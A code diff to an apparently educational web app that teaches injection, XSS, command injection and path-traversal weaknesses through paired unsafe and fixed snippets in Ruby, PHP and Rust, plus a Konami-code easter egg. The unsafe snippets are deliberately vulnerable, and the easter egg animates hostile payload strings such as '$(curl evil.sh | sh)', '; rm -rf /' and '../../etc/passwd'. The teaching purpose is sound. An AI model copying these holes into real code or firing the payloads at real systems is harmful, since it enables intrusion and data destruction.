+        f: L('SUM = /\\A(\\d+) ([+*]) (\\d+)\\z/   # \\A \\z, not ^ $ (those match per line)', '', 'def calc', '  m = SUM.match(params[:expr].to_s) or return head(:bad_request)', '  a, b = m[1].to_i, m[3].to_i', '  render plain: (m[2] == "+" ? a + b : a * b).to_s', 'end'), fh: 3 },
+      m79: { sink: 'raw / html_safe', guard: 'a plain <%= %>',
+        u: L('<%# hello.html.erb %>', '<h1>Hi <%= raw params[:name] %></h1>'), uh: 1,
+        f: L('<%# hello.html.erb %>', '<h1>Hi <%= params[:name] %></h1>   <%# ERB escapes %>'), fh: 1 },
+      m78: { sink: 'backticks (a shell)', guard: 'Open3.capture2 with separate args',
+        u: L('def ping', '  render plain: `ping -c 1 #{params[:host]}`', 'end'), uh: 1,
+        f: L('HOSTS = %w[web-1 web-2].freeze', '', 'def ping', '  host = params[:host]', '  return head(:bad_request) unless HOSTS.include?(host)', '  out, _ = Open3.capture2("ping", "-c", "1", host)   # no shell', '  render plain: out', 'end'), fh: 4 },
+      m22: { sink: 'Rails.root.join() + send_file', guard: 'a server-owned Hash',
+        u: L('def download', '  send_file Rails.root.join("files", params[:name])', 'end'), uh: 1,
+        f: L('FILES = { "report.pdf" => "a91f.pdf" }.freeze', '', 'def download', '  stored = FILES[params[:name]] or return head(:not_found)', '  send_file Rails.root.join("files", stored)', 'end'), fh: 3 } },
+
+    /* ===== PHP ===== */
+    { id: 'laravel', group: 'PHP', label: 'Laravel', lang: 'PHP',
+      m94: { sink: 'eval()', guard: 'preg_match()', payload: "file_get_contents('.env')",
+        u: L("Route::get('/calc', function (Request $request) {", "    return eval('return ' . $request->query('expr') . ';');   // \"2 + 3\"", '});'), uh: 1,
+        f: L("Route::get('/calc', function (Request $request) {", "    if (!preg_match('/^(\\d+) ([+*]) (\\d+)$/D', (string) $request->query('expr'), $m)) {", '        abort(400);', '    }', "    return $m[2] === '+' ? $m[1] + $m[3] : $m[1] * $m[3];", '});'), fh: 1 },
+      m79: { sink: 'Blade {!! !!}', guard: 'Blade {{ }}',
+        u: L('{{-- hello.blade.php --}}', "<h1>Hi {!! request('name') !!}</h1>"), uh: 1,
+        f: L('{{-- hello.blade.php --}}', "<h1>Hi {{ request('name') }}</h1>   {{-- escaped --}}"), fh: 1 },
+      m78: { sink: 'Process::run() with a string', guard: 'Process::run() with an array',
+        u: L("Route::get('/ping', function (Request $request) {", "    return Process::run('ping -c 1 ' . $request->query('host'))->output();", '});'), uh: 1,
+        f: L("Route::get('/ping', function (Request $request) {", "    $host = $request->query('host');", "    abort_unless(in_array($host, ['web-1', 'web-2'], true), 400);", "    return Process::run(['ping', '-c', '1', $host])->output();   // array: no shell", '});'), fh: 2 },
+      m22: { sink: 'storage_path() + download()', guard: 'a server-owned map',
+        u: L("Route::get('/file', function (Request $request) {", "    return response()->download(storage_path('files/' . $request->query('name')));", '});'), uh: 1,
+        f: L("Route::get('/file', function (Request $request) {", "    $stored = config('files.map')[$request->query('name')] ?? abort(404);", "    return response()->download(storage_path('files/' . $stored));", '});'), fh: 1 } },
+
+    { id: 'php', group: 'PHP', label: 'Plain PHP', lang: 'PHP',
+      m94: { sink: 'eval()', guard: 'preg_match()', payload: "file_get_contents('.env')",
+        u: L('<?php', "echo eval('return ' . $_GET['expr'] . ';');   // \"2 + 3\""), uh: 1,
+        f: L('<?php', "if (!preg_match('/^(\\d+) ([+*]) (\\d+)$/D', $_GET['expr'] ?? '', $m)) {", '    http_response_code(400); exit;', '}', "echo $m[2] === '+' ? $m[1] + $m[3] : $m[1] * $m[3];"), fh: 1 },
+      m79: { sink: 'echo of the raw value', guard: 'htmlspecialchars()',
+        u: L('<?php', "echo '<h1>Hi ' . $_GET['name'] . '</h1>';"), uh: 1,
+        f: L('<?php', "echo '<h1>Hi ' . htmlspecialchars($_GET['name'] ?? '', ENT_QUOTES, 'UTF-8') . '</h1>';"), fh: 1 },
+      m78: { sink: 'shell_exec()', guard: 'proc_open() with an array',
+        u: L('<?php', "echo shell_exec('ping -c 1 ' . $_GET['host']);"), uh: 1,
+        f: L('<?php', "$host = $_GET['host'] ?? '';", "if (!in_array($host, ['web-1', 'web-2'], true)) { http_response_code(400); exit; }", "$p = proc_open(['ping', '-c', '1', $host], [1 => ['pipe', 'w']], $pipes);   // array: no shell", 'echo stream_get_contents($pipes[1]);'), fh: 2 },
+      m22: { sink: 'string concatenation + readfile()', guard: 'a server-owned array',
+        u: L('<?php', "readfile('/srv/files/' . $_GET['name']);"), uh: 1,
+        f: L('<?php', "$files = ['report.pdf' => 'a91f.pdf'];   // set by the server", "$stored = $files[$_GET['name'] ?? ''] ?? null;", 'if ($stored === null) { http_response_code(404); exit; }', "readfile('/srv/files/' . $stored);"), fh: 2 } },
+
+    /* ===== Rust ===== */
+    { id: 'axum', group: 'Rust', label: 'Axum', lang: 'Rust',
+      m94: { sink: 'a rhai engine eval() with host functions', guard: 'a Regex', payload: 'read_file(".env")',
+        u: L('async fn calc(Query(q): Query<Calc>) -> String {', '    let mut engine = rhai::Engine::new();', '    engine.register_fn("read_file", |p: &str| std::fs::read_to_string(p).unwrap_or_default());', '    engine.eval::<rhai::Dynamic>(&q.expr).map(|v| v.to_string()).unwrap_or_default()   // "2 + 3"', '}'), uh: 3,
+        f: L('async fn calc(Query(q): Query<Calc>) -> Result<String, StatusCode> {', '    let re = Regex::new(r"^(\\d+) ([+*]) (\\d+)$").unwrap();', '    let c = re.captures(&q.expr).ok_or(StatusCode::BAD_REQUEST)?;', '    let (a, b): (i64, i64) = (c[1].parse().unwrap(), c[3].parse().unwrap());', '    Ok(if &c[2] == "+" { a + b } else { a * b }.to_string())', '}'), fh: 2 },
+      m79: { sink: 'format!() into Html', guard: 'html_escape::encode_text()',
+        u: L('async fn hi(Query(q): Query<Hi>) -> Html<String> {', '    Html(format!("<h1>Hi {}</h1>", q.name))', '}'), uh: 1,
+        f: L('async fn hi(Query(q): Query<Hi>) -> Html<String> {', '    Html(format!("<h1>Hi {}</h1>", html_escape::encode_text(&q.name)))', '}'), fh: 1 },
+      m78: { sink: 'Command::new("sh").arg("-c")', guard: 'Command::new("ping").args()',
+        u: L('async fn ping(Query(q): Query<Ping>) -> Vec<u8> {', '    Command::new("sh").arg("-c").arg(format!("ping -c 1 {}", q.host))', '        .output().unwrap().stdout', '}'), uh: 1,
+        f: L('async fn ping(Query(q): Query<Ping>) -> Result<Vec<u8>, StatusCode> {', '    if !["web-1", "web-2"].contains(&q.host.as_str()) { return Err(StatusCode::BAD_REQUEST); }', '    Ok(Command::new("ping").args(["-c", "1", &q.host]).output().unwrap().stdout)   // no shell', '}'), fh: 1 },
+      m22: { sink: 'Path::join() + fs::read()', guard: 'a server-owned map',
+        u: L('async fn file(Query(q): Query<FileQ>) -> Vec<u8> {', '    tokio::fs::read(Path::new("/srv/files").join(&q.name)).await.unwrap_or_default()', '}'), uh: 1,
+        f: L('async fn file(Query(q): Query<FileQ>) -> Result<Vec<u8>, StatusCode> {', '    let stored = FILES.get(q.name.as_str()).ok_or(StatusCode::NOT_FOUND)?;   // server-owned', '    Ok(tokio::fs::read(Path::new("/srv/files").join(stored)).await.unwrap_or_default())', '}'), fh: 1 } }
+  ];
+  const STACK_BY_ID = Object.fromEntries(STACKS.map(s => [s.id, s]));
+  const STACK_KEY = 'cwe-triage-lab:stack';
+  let stackId = 'express';
+  try { const s = localStorage.getItem(STACK_KEY); if (s && STACK_BY_ID[s]) stackId = s; } catch (e) {}
+  function stackLabel(s) { return s.group.replace(' / TypeScript', '') + ' · ' + s.label; }
+  /* What to show for a module: the chosen stack, or its server-side partner when the stack is browser-only. */
+  function resolve(moduleId) {
+    const s = STACK_BY_ID[stackId];
+    if (s[moduleId]) return { s, d: s[moduleId], via: null };
+    const b = STACK_BY_ID[s.client];
+    return { s: b, d: b[moduleId], via: s };
+  }
+  function fill(t, d) { return t.replace(/\{sink\}/g, d.sink).replace(/\{guard\}/g, d.guard).replace(/\{payload\}/g, d.payload || ''); }
+  function stackSelect(cls) {
+    const sel = h('select', { class: 'stack-select ' + (cls || ''), 'aria-label': 'Language and framework' });
+    const groups = {};
+    STACKS.forEach(s => {
+      if (!groups[s.group]) { groups[s.group] = h('optgroup', { label: s.group }); sel.append(groups[s.group]); }
+      groups[s.group].append(h('option', { value: s.id, text: stackLabel(s) + (s.client ? ' (browser)' : '') }));
+    });
+    sel.value = stackId;
+    sel.addEventListener('change', () => setStack(sel.value));
+    return sel;
+  }
+  const painters = [];
+  function setStack(id) {
+    if (!STACK_BY_ID[id]) return;
+    stackId = id;
+    try { localStorage.setItem(STACK_KEY, id); } catch (e) {}
+    document.querySelectorAll('.stack-select').forEach(s => { s.value = id; });
+    painters.forEach(p => p());
+  }
+
   /* ---------- storage (per-viewer convenience only) ---------- */
   const KEY = 'cwe-triage-lab:v2';
   let done = {};
@@ -468,13 +919,58 @@ footer p { margin: 0; max-width: 64ch; }
     (kids || []).forEach(c => { if (c != null) el.append(c); });
     return el;
   }
-  function codeBlock(src, hot) {
+  /* ---------- syntax highlighting: a small single-line tokenizer, enough for teaching snippets ---------- */
+  const KW = new Set(('abstract and as async await break case catch chan class const continue def defer del do elif else elseif end ensure enum except export extends ' +
+    'false final finally fn for foreach from fun func go if impl implements import in instanceof interface is lambda let loop mod module mut namespace new nil ' +
+    'not null or package pass private protected public raise readonly record require rescue return self static struct super switch this throw throws true try type ' +
+    'unless until use using val var void when while with yield None True False echo').split(' '));
+  const HASH_COMMENT = new Set(['Python', 'Ruby', 'PHP']);
+  const SLASH_COMMENT = new Set(['Java', 'Kotlin', 'JavaScript', 'TypeScript', 'JSX', 'C#', 'Go', 'Rust', 'PHP', 'Razor', 'Vue SFC']);
+  function highlight(line, lang) {
+    const out = [];
+    const push = (cls, t) => { if (!t) return; const last = out[out.length - 1]; if (last && last[0] === cls) last[1] += t; else out.push([cls, t]); };
+    const re = /(\/\*.*?\*\/|<!--.*?-->|@\*.*?\*@|\{\{--.*?--\}\}|<%#.*?%>|<%--.*?--%>)|("""[\s\S]*?"""|"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`)|(\/\/.*$)|(#.*$)|((?<![\w$])<\/?[A-Za-z][\w:.-]*|\/?>)|(@[A-Za-z_][\w.]*)|(\$[A-Za-z_]\w*)|(\b\d+(?:\.\d+)?\b)|([A-Za-z_]\w*)/g;
+    let i = 0, m;
+    while ((m = re.exec(line))) {
+      if (m.index > i) push('', line.slice(i, m.index));
+      const [tok, blockCom, str, slashCom, hashCom, tag, anno, phpVar, num, ident] = m;
+      if (blockCom) push('c', tok);
+      else if (str) push('s', tok);
+      else if (slashCom) { if (SLASH_COMMENT.has(lang)) { push('c', line.slice(m.index)); i = line.length; break; } push('', '/'); re.lastIndex = m.index + 1; }
+      else if (hashCom) { if (HASH_COMMENT.has(lang) && !/[\w$]/.test(line[m.index - 1] || '')) { push('c', line.slice(m.index)); i = line.length; break; } push('', '#'); re.lastIndex = m.index + 1; }
+      else if (tag) push('t', tok);
+      else if (anno) push('a', tok);
+      else if (phpVar) push('v', tok);
+      else if (num) push('n', tok);
+      else if (ident) {
+        const prev = line[m.index - 1] || '', rest = line.slice(m.index + tok.length);
+        if (KW.has(tok) && prev !== '.') push('k', tok);
+        else if (/^\s*[(<!]?\s*\(/.test(rest) || /^\(/.test(rest) || /^!\(/.test(rest)) push('f', tok);
+        else if (/^[A-Z]/.test(tok) && /[a-z]/.test(tok)) push('y', tok);
+        else push('', tok);
+      }
+      i = re.lastIndex;
+      if (m[0].length === 0) re.lastIndex++;
+    }
+    if (i < line.length) push('', line.slice(i));
+    return out;
+  }
+  function codeBlock(src, hot, lang) {
     const pre = h('pre', { class: 'code' });
-    src.split('\n').forEach((line, i) => pre.append(h('span', { class: 'ln' + (i === hot ? ' hot' : ''), text: line || ' ' })));
+    src.split('\n').forEach((line, i) => {
+      const ln = h('span', { class: 'ln' + (i === hot ? ' hot' : '') });
+      if (!line) ln.textContent = ' ';
+      else highlight(line, lang).forEach(([cls, t]) => ln.append(cls ? h('span', { class: 'tk-' + cls, text: t }) : document.createTextNode(t)));
+      pre.append(ln);
+    });
     return pre;
   }
 
   /* ---------- nav + index ---------- */
+  (function mountPickers() {
+    const a = stackSelect('side'); a.id = 'stackSide'; document.getElementById('sideStack').append(a);
+    const b = stackSelect('hero'); b.id = 'stackHero'; document.getElementById('heroStack').append(b);
+  })();
   const nav = document.getElementById('nav');
   const index = document.getElementById('index');
   const menu = document.getElementById('menu');
@@ -531,62 +1027,11 @@ footer p { margin: 0; max-width: 64ch; }
 
     wrap.append(h('div', { class: 'rule' }, [h('span', { class: 'eyebrow', text: 'The rule' }), h('p', { text: m.lesson })]));
 
-    wrap.append(h('div', { class: 'story' }, [
-      h('div', null, [h('h3', { text: '01 · The setup' }), h('p', { text: m.problem })]),
-      h('div', null, [h('h3', { text: '02 · Why it breaks' }), h('p', { text: m.why })]),
-      h('div', null, [h('h3', { text: '03 · Why the fix holds' }), h('p', { text: m.works })])
-    ]));
-
-    const sUnsafe = h('figure', { class: 'snip unsafe' }, [h('figcaption', null, [h('span', { text: 'Unsafe' }), h('small', { text: 'highlighted: the sink' })]), codeBlock(m.unsafe.code, m.unsafe.hot)]);
-    const sFixed = h('figure', { class: 'snip fixed' }, [h('figcaption', null, [h('span', { text: 'Fixed' }), h('small', { text: 'highlighted: the guard' })]), codeBlock(m.fixed.code, m.fixed.hot)]);
-    wrap.append(h('div', { class: 'pair' }, [sUnsafe, sFixed]));
-
-    /* tracer */
-    let sample = 0, version = 'unsafe';
-    const chips = h('div', { class: 'chips', role: 'group', 'aria-label': 'Input to send' });
-    const rIn = h('li'), rOp = h('li'), rOut = h('li');
-    const verdict = h('p', { class: 'verdict', 'aria-live': 'polite' });
-    const bU = h('button', { type: 'button', class: 'u', 'aria-pressed': 'true', text: 'Unsafe', onclick: () => { version = 'unsafe'; run(); } });
-    const bF = h('button', { type: 'button', class: 'f', 'aria-pressed': 'false', text: 'Fixed', onclick: () => { version = 'fixed'; run(); } });
-    m.samples.forEach((s, i) => chips.append(h('button', { type: 'button', class: 'chip', 'aria-pressed': i === 0 ? 'true' : 'false', onclick: () => { sample = i; run(); } }, [h('span', { class: 'k', text: s.kind }), document.createTextNode(s.input)])));
-
-    function slot(li, head, val, cls, code) {
-      li.className = cls || '';
-      li.textContent = '';
-      li.append(h('span', { class: 'h', text: head }), h('span', { class: 'v' + (code ? ' code' : ''), text: val }));
-    }
-    let timers = [];
-    function run() {
-      timers.forEach(clearTimeout); timers = [];
-      const s = m.samples[sample], r = s[version];
-      [...chips.children].forEach((c, i) => c.setAttribute('aria-pressed', i === sample ? 'true' : 'false'));
-      bU.setAttribute('aria-pressed', version === 'unsafe'); bF.setAttribute('aria-pressed', version === 'fixed');
-      sUnsafe.classList.toggle('dim', version !== 'unsafe'); sFixed.classList.toggle('dim', version !== 'fixed');
-      sUnsafe.classList.toggle('on', version === 'unsafe'); sFixed.classList.toggle('on', version === 'fixed');
-      const outCls = r.effect === 'harm' ? 'harm' : (r.effect === 'blocked' ? 'safe' : '');
-      const outHead = r.effect === 'harm' ? 'Outcome · harm' : (r.effect === 'blocked' ? 'Outcome · blocked' : 'Outcome');
-      slot(rIn, 'Input', s.input, '', true);
-      slot(rOp, 'What the code does', r.op, '');
-      slot(rOut, outHead, r.out, outCls);
-      verdict.textContent = '';
-      const reduce = window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matches;
-      const steps = [() => rIn.classList.add('lit'), () => rOp.classList.add('lit'), () => {
-        rOut.classList.add('lit');
-        verdict.textContent = r.effect === 'harm' ? 'The ' + version + ' code let this input do damage.' :
-          r.effect === 'blocked' ? 'The guard stopped it before anything ran.' : 'Ordinary input works the same either way.';
-      }];
-      steps.forEach((f, i) => reduce ? f() : timers.push(setTimeout(f, 120 + i * 260)));
-    }
-
-    wrap.append(h('div', { class: 'tracer' }, [
-      h('div', { class: 'tracer-top' }, [
-        h('div', null, [h('span', { class: 'eyebrow group-label', text: 'Send an input' }), chips]),
-        h('div', null, [h('span', { class: 'eyebrow group-label', text: 'Through' }), h('div', { class: 'toggle', role: 'group', 'aria-label': 'Code version' }, [bU, bF])])
-      ]),
-      h('ol', { class: 'rail', 'aria-label': 'Trace' }, [rIn, rOp, rOut]),
-      verdict
-    ]));
-    run();
+    const lessonSlot = h('div', { class: 'lesson' });
+    wrap.append(lessonSlot);
+    const paint = () => paintLesson(m, lessonSlot);
+    paint();
+    painters.push(paint);
 
     wrap.append(renderDrill(m));
 
@@ -603,6 +1048,81 @@ footer p { margin: 0; max-width: 64ch; }
     return sec;
   }
 
+  /* ---------- the lesson block: story, code pair, tracer; repainted when the language changes ---------- */
+  function paintLesson(m, slotEl) {
+    const LS = LESSONS[m.id];
+    const { s: shown, d, via } = resolve(m.id);
+    slotEl.textContent = '';
+
+    const bar = h('div', { class: 'stackbar' }, [
+      h('label', { class: 'eyebrow' }, [document.createTextNode('Code in'), stackSelect('inline')]),
+      via ? h('p', { class: 'stack-note', text: via.label + ' runs in the browser, so this server-side weakness is shown in ' + stackLabel(shown) + ', a common back end for it.' }) : null
+    ]);
+    slotEl.append(bar);
+
+    slotEl.append(h('div', { class: 'story' }, [
+      h('div', null, [h('h3', { text: '01 \u00b7 The setup' }), h('p', { text: fill(LS.problem, d) })]),
+      h('div', null, [h('h3', { text: '02 \u00b7 Why it breaks' }), h('p', { text: fill(LS.why, d) })]),
+      h('div', null, [h('h3', { text: '03 \u00b7 Why the fix holds' }), h('p', { text: fill(LS.works, d) })])
+    ]));
+
+    const cap = (kind, what, label) => h('figcaption', null, [h('span', { text: kind + ' \u00b7 ' + shown.lang }), h('small', { text: what + ': ' + label })]);
+    const sUnsafe = h('figure', { class: 'snip unsafe' }, [cap('Unsafe', 'sink', d.sink), codeBlock(d.u, d.uh, shown.lang)]);
+    const sFixed = h('figure', { class: 'snip fixed' }, [cap('Fixed', 'guard', d.guard), codeBlock(d.f, d.fh, shown.lang)]);
+    slotEl.append(h('div', { class: 'pair' }, [sUnsafe, sFixed]));
+
+    const samples = LS.samples.map(x => ({
+      kind: x.kind, input: fill(x.input, d),
+      unsafe: Object.assign({}, x.unsafe, { op: fill(x.unsafe.op, d) }),
+      fixed: Object.assign({}, x.fixed, { op: fill(x.fixed.op, d) })
+    }));
+    let sample = 0, version = 'unsafe';
+    const chips = h('div', { class: 'chips', role: 'group', 'aria-label': 'Input to send' });
+    const rIn = h('li'), rOp = h('li'), rOut = h('li');
+    const verdict = h('p', { class: 'verdict', 'aria-live': 'polite' });
+    const bU = h('button', { type: 'button', class: 'u', 'aria-pressed': 'true', text: 'Unsafe', onclick: () => { version = 'unsafe'; run(); } });
+    const bF = h('button', { type: 'button', class: 'f', 'aria-pressed': 'false', text: 'Fixed', onclick: () => { version = 'fixed'; run(); } });
+    samples.forEach((x, i) => chips.append(h('button', { type: 'button', class: 'chip', 'aria-pressed': i === 0 ? 'true' : 'false', onclick: () => { sample = i; run(); } }, [h('span', { class: 'k', text: x.kind }), document.createTextNode(x.input)])));
+
+    function slot(li, head, val, cls, code) {
+      li.className = cls || '';
+      li.textContent = '';
+      li.append(h('span', { class: 'h', text: head }), h('span', { class: 'v' + (code ? ' code' : ''), text: val }));
+    }
+    let timers = [];
+    function run() {
+      timers.forEach(clearTimeout); timers = [];
+      const x = samples[sample], r = x[version];
+      [...chips.children].forEach((c, i) => c.setAttribute('aria-pressed', i === sample ? 'true' : 'false'));
+      bU.setAttribute('aria-pressed', version === 'unsafe'); bF.setAttribute('aria-pressed', version === 'fixed');
+      sUnsafe.classList.toggle('dim', version !== 'unsafe'); sFixed.classList.toggle('dim', version !== 'fixed');
+      sUnsafe.classList.toggle('on', version === 'unsafe'); sFixed.classList.toggle('on', version === 'fixed');
+      const outCls = r.effect === 'harm' ? 'harm' : (r.effect === 'blocked' ? 'safe' : '');
+      const outHead = r.effect === 'harm' ? 'Outcome \u00b7 harm' : (r.effect === 'blocked' ? 'Outcome \u00b7 blocked' : 'Outcome');
+      slot(rIn, 'Input', x.input, '', true);
+      slot(rOp, 'What the code does', r.op, '');
+      slot(rOut, outHead, r.out, outCls);
+      verdict.textContent = '';
+      const reduce = window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matches;
+      const steps = [() => rIn.classList.add('lit'), () => rOp.classList.add('lit'), () => {
+        rOut.classList.add('lit');
+        verdict.textContent = r.effect === 'harm' ? 'The ' + version + ' code let this input do damage.' :
+          r.effect === 'blocked' ? 'The guard stopped it before anything ran.' : 'Ordinary input works the same either way.';
+      }];
+      steps.forEach((f, i) => reduce ? f() : timers.push(setTimeout(f, 120 + i * 260)));
+    }
+
+    slotEl.append(h('div', { class: 'tracer' }, [
+      h('div', { class: 'tracer-top' }, [
+        h('div', null, [h('span', { class: 'eyebrow group-label', text: 'Send an input' }), chips]),
+        h('div', null, [h('span', { class: 'eyebrow group-label', text: 'Through' }), h('div', { class: 'toggle', role: 'group', 'aria-label': 'Code version' }, [bU, bF])])
+      ]),
+      h('ol', { class: 'rail', 'aria-label': 'Trace' }, [rIn, rOp, rOut]),
+      verdict
+    ]));
+    run();
+  }
+
   function renderDrill(m) {
     const d = m.drill;
     const det = h('details', { class: 'drill' });
@@ -617,8 +1137,9 @@ footer p { margin: 0; max-width: 64ch; }
     const body = h('div', { class: 'drill-body' });
     det.append(body);
     body.append(h('p', { class: 'scenario', text: d.scenario }));
+    body.append(h('p', { class: 'drill-lang', text: 'Drill code is JavaScript (Node.js + Express) for every language setting: the source \u2192 sink \u2192 gap pattern is the same in any stack.' }));
     body.append(h('div', { class: 'alert' }, [h('span', { class: 'sev', text: d.alert.severity }), h('span', { text: d.alert.rule }), h('span', { class: 'loc', text: d.alert.location })]));
-    body.append(codeBlock(d.code, -1));
+    body.append(codeBlock(d.code, -1, 'JavaScript'));
 
     const qs = [['source', 'Step 1 · Source', 'Where does untrusted text enter?'], ['sink', 'Step 2 · Sink', 'Where is it interpreted?'], ['control', 'Step 3 · Gap', 'Which control is missing?']];
     const grid = h('div', { class: 'qs' });
@@ -678,7 +1199,7 @@ footer p { margin: 0; max-width: 64ch; }
 
   document.getElementById('reset').addEventListener('click', () => {
     done = {}; try { localStorage.removeItem(KEY); } catch (e) {}
-    host.textContent = ''; MODULES.forEach(m => host.append(renderModule(m))); renderNav(); route(false);
+    host.textContent = ''; painters.length = 0; MODULES.forEach(m => host.append(renderModule(m))); renderNav(); route(false);
   });
 
   /* one view at a time: the hash picks it, the window starts at the top */
@@ -717,6 +1238,104 @@ footer p { margin: 0; max-width: 64ch; }
   window.addEventListener('popstate', () => route(true));
   window.addEventListener('load', () => requestAnimationFrame(() => window.scrollTo(0, 0)));
   route(false);
+  /* ---------- themes ---------- */
+  const THEMES = [
+    { id: 'system', name: 'System', note: 'follows your device', a: '#0f0c09', b: '#f6f0e4' },
+    { id: 'candle', name: 'Candlelight', note: 'warm dark', a: '#0f0c09', b: '#d8a942' },
+    { id: 'parchment', name: 'Parchment', note: 'light', a: '#f6f0e4', b: '#8a6512' },
+    { id: 'midnight', name: 'Midnight', note: 'cool dark', a: '#0b0f17', b: '#7fb4ff' },
+    { id: 'phosphor', name: 'Phosphor', note: 'green-screen terminal', a: '#050a06', b: '#7dff9e' },
+    { id: 'contrast', name: 'High contrast', note: 'maximum legibility', a: '#000000', b: '#ffd400' },
+    { id: 'arcade', name: 'Arcade', note: 'secret: unlocked', a: '#0d0221', b: '#ff3ea5', secret: true }
+  ];
+  const THEME_KEY = 'cwe-triage-lab:theme', ARCADE_KEY = 'cwe-triage-lab:arcade';
+  const get = k => { try { return localStorage.getItem(k); } catch (e) { return null; } };
+  const put = (k, v) => { try { localStorage.setItem(k, v); } catch (e) {} };
+  let arcade = get(ARCADE_KEY) === '1';
+  let themeId = get(THEME_KEY) || 'system';
+  if (themeId === 'arcade' && !arcade) themeId = 'system';
+  const mqLight = window.matchMedia ? matchMedia('(prefers-color-scheme: light)') : null;
+  function applyTheme() {
+    const t = themeId === 'system' ? (mqLight && mqLight.matches ? 'parchment' : 'candle') : themeId;
+    document.documentElement.setAttribute('data-theme', t);
+    const th = THEMES.find(x => x.id === themeId);
+    document.getElementById('themeName').textContent = th.name + ' · ' + th.note;
+    document.querySelectorAll('.sw').forEach(b => { const on = b.dataset.id === themeId; b.setAttribute('aria-checked', String(on)); b.tabIndex = on ? 0 : -1; });
+  }
+  function setTheme(id) { themeId = id; put(THEME_KEY, id); applyTheme(); }
+  function renderSwatches(popId) {
+    const box = document.getElementById('swatches');
+    box.textContent = '';
+    THEMES.filter(t => !t.secret || arcade).forEach(t => {
+      const b = h('button', { type: 'button', class: 'sw' + (t.id === popId ? ' secret' : ''), role: 'radio', 'data-id': t.id, 'aria-label': t.name + ', ' + t.note, title: t.name, onclick: () => setTheme(t.id) },
+        [h('i', { style: 'background: linear-gradient(135deg, ' + t.a + ' 0 50%, ' + t.b + ' 50% 100%)' })]);
+      box.append(b);
+    });
+    applyTheme();
+  }
+  /* arrow keys move between swatches, as in any radio group */
+  document.getElementById('swatches').addEventListener('keydown', e => {
+    const k = e.key; if (!/^Arrow/.test(k)) return;
+    e.preventDefault(); e.stopPropagation();
+    const list = [...document.querySelectorAll('.sw')], i = list.findIndex(b => b.dataset.id === themeId);
+    const n = list[(i + (k === 'ArrowRight' || k === 'ArrowDown' ? 1 : -1) + list.length) % list.length];
+    setTheme(n.dataset.id); n.focus();
+  });
+  if (mqLight && mqLight.addEventListener) mqLight.addEventListener('change', () => { if (themeId === 'system') applyTheme(); });
+  renderSwatches();
+
+
+  /* ---------- settings popover ---------- */
+  const gear = document.getElementById('gear'), settings = document.getElementById('settings');
+  function openSettings(open) {
+    settings.hidden = !open; gear.setAttribute('aria-expanded', String(open));
+    if (open) { closeMenu(); const on = settings.querySelector('.sw[aria-checked="true"]'); if (on) on.focus(); }
+  }
+  gear.addEventListener('click', e => { e.stopPropagation(); openSettings(settings.hidden); });
+  document.addEventListener('click', e => { if (!settings.hidden && !settings.contains(e.target) && e.target !== gear) openSettings(false); });
+  document.addEventListener('keydown', e => { if (e.key === 'Escape' && !settings.hidden) { openSettings(false); gear.focus(); } });
+  menu.addEventListener('click', () => openSettings(false));
+  /* ---------- easter egg: up up down down left right left right B A ---------- */
+  const KONAMI = ['arrowup', 'arrowup', 'arrowdown', 'arrowdown', 'arrowleft', 'arrowright', 'arrowleft', 'arrowright', 'b', 'a'];
+  let pos = 0;
+  document.addEventListener('keydown', e => {
+    const tag = (e.target && e.target.tagName) || '';
+    if (/^(INPUT|TEXTAREA|SELECT)$/.test(tag) || e.target.isContentEditable) return;
+    const k = (e.key || '').toLowerCase();
+    pos = k === KONAMI[pos] ? pos + 1 : (k === KONAMI[0] ? 1 : 0);
+    if (pos === KONAMI.length) { pos = 0; konami(); }
+  });
+  function konami() {
+    const first = !arcade;
+    arcade = true; put(ARCADE_KEY, '1');
+    renderSwatches(first ? 'arcade' : null);
+    const reduce = window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matches;
+    if (!reduce) {
+      const payloads = ["'; DROP TABLE users;--", '<script>alert(1)<\/script>', '../../etc/passwd', '$(curl evil.sh | sh)', "eval(atob('...'))", '<img onerror=x>', '; rm -rf /', '%2e%2e%2f', '{{7*7}}', '`id`', '-oProxyCommand=sh', "__import__('os')"];
+      const egg = h('div', { class: 'egg', 'aria-hidden': 'true' }, [h('div', { class: 'shield' })]);
+      for (let i = 0; i < 22; i++) {
+        const sp = h('span', { text: payloads[i % payloads.length] });
+        const d = 1.6 + Math.random() * 1.2, delay = Math.random() * 1.4;
+        sp.style.left = (4 + Math.random() * 82) + '%';
+        sp.style.setProperty('--d', d + 's'); sp.style.setProperty('--delay', delay + 's');
+        setTimeout(() => { sp.classList.add('caught'); sp.textContent = '✓ blocked'; }, (d + delay) * 1000 - 40);
+        egg.append(sp);
+      }
+      document.body.append(egg);
+      setTimeout(() => egg.remove(), 5200);
+    }
+    const old = document.querySelector('.toast'); if (old) old.remove();
+    const toast = h('div', { class: 'toast', role: 'status' }, [
+      h('b', { text: first ? 'Cheat code accepted.' : 'Still got it.' }),
+      h('p', { text: first ? 'Every payload validated, encoded and turned away at the sink. +30 lives, and a secret Arcade theme is now in your theme picker.' : 'All payloads blocked again. The Arcade theme is waiting in your theme picker.' }),
+      h('div', { class: 'btns' }, [
+        h('button', { type: 'button', class: 'btn', text: themeId === 'arcade' ? 'Back to Candlelight' : 'Play in Arcade', onclick: () => { setTheme(themeId === 'arcade' ? 'candle' : 'arcade'); toast.remove(); } }),
+        h('button', { type: 'button', class: 'btn ghost', text: 'Dismiss', onclick: () => toast.remove() })
+      ])
+    ]);
+    document.body.append(toast);
+    setTimeout(() => { if (toast.isConnected) toast.remove(); }, 12000);
+  }
 })();
 </script>
 </body>
